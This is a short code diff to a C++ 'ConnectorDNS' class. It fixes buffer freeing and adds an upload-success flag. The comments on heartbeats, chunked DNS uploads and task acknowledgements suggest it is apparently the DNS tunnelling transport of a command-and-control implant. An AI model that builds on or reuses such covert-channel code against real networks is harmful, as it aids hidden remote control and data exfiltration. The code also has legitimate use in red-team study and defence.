@@ -401,11 +401,9 @@ void ConnectorDNS::CloseConnector()
 {
     // Free any allocated receive buffer.
     if (this->recvData) {
-        // Using HeapFree / LocalFree would require function pointers
-        // similar to other connectors; for this stub we simply ignore
-        // allocator details and reset the pointer/state.
-        this->recvData = NULL;
-        this->recvSize = 0;
+		MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
+		this->recvData = NULL;
+		this->recvSize = 0;
     }
     if (this->hiBeat && this->hiBeatSize) {
         MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
@@ -555,6 +553,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     // 之后所有有数据的调用视为 PUT，使用应用层分片：
     // frame = [META_V1:8][4 bytes total_len][4 bytes offset][chunk...]
     if (data && data_size) {
+        this->lastQueryOk = TRUE;
         const ULONG metaSize = sizeof(DNS_META_V1);
         const ULONG headerSize = metaSize + 8; // meta + [total][offset]
         ULONG total = data_size;
@@ -632,6 +631,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             }
             
             if (!putOk) {
+                this->lastQueryOk = FALSE;
                 return;  // Abort upload, will retry entire upload next time
             }
 
@@ -645,6 +645,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         }
         // 记录本次上行总量，供自适应 sleep 使用
         this->lastUpTotal = total;
+        this->lastQueryOk = TRUE;
         
         // After PUT, send ACK heartbeat with nonce to confirm task was received
         // After PUT, send ACK heartbeat with taskNonce to confirm which task was completed
@@ -1019,8 +1020,11 @@ int ConnectorDNS::RecvSize()
 
 void ConnectorDNS::RecvClear()
 {
-    this->recvData = NULL;
-    this->recvSize = 0;
+	if (this->recvData) {
+		MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
+		this->recvData = NULL;
+		this->recvSize = 0;
+	}
 }
 
 BOOL ConnectorDNS::IsBusy() const
